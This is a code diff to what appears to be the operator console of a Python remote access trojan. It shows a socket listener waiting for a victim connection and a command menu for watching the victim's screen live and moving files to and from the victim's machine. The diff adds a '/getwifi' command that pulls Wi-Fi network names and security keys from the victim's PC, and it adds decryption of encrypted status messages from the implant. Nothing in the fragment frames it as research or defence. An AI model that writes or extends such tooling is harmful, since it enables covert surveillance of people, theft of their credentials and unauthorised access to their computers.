@@ -83,12 +83,12 @@ s = socket.socket()
 s.bind((SERVER_HOST, SERVER_PORT))
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 s.listen(5)
-print(f"[{IMPORTANT}] {BOLD}Awaiting connection on {SERVER_HOST}:{SERVER_PORT} .....{END}")
+print(f"[{IMPORTANT}] {BOLD}Awaiting connection on {SERVER_HOST}:{SERVER_PORT} ......{END}")
 
 client_socket, client_address = s.accept()
 print(f"[{IMPORTANT}] {BOLD}{client_address[0]}:{client_address[1]} Connected! \n{END}")
 time.sleep(1)
-print(f'\r[{GREEN}Shell{END}] {BOLD}Stabilizing command prompt .....{END}', end = '\n\n') #yes I stole this from hoax get over it
+print(f'\r[{GREEN}Shell{END}] {BOLD}Stabilizing command prompt ......{END}', end = '\n\n') #yes I stole this from hoax get over it
 time.sleep(1.8)
 
 
@@ -170,6 +170,7 @@ while True:
         \r  /stoplive                  Stop the live feed of victim's screen.
         \r  /sendfile                  Sends a file from the files directory in the victom's CWD directory.
         \r  /getfile                   Gets a file from the victim's CWD and puts it into the files directory.
+        \r  /getwifi                   Gets SSIDs and security keys from victim's PC.
         \r  /clear                     Clear screen.
         \r  /exit/quit/q               Close session and exit.
         {END}''')
@@ -232,8 +233,11 @@ while True:
                     client_socket.send(dataLen.to_bytes(4,'big'))
                     client_socket.send(data)
                 f.close()
+                server_state = client_socket.recv(BUFFER_SIZE)
+                server_state = Fernet(key).decrypt(server_state).decode()
+                print(f"[{IMPORTANT}] {server_state}")
             if server_location == "yes":
-                print(f"\n[{IMPORTANT}] Found live Streaming Server in RAT CWD")
+                print(f"\n[{IMPORTANT}] Found live Streaming Server on RAT")
             print(f"[{IMPORTANT}] Starting live Streaming Server ......")
             p = Thread(target=receiver.start_server)
             p.start()
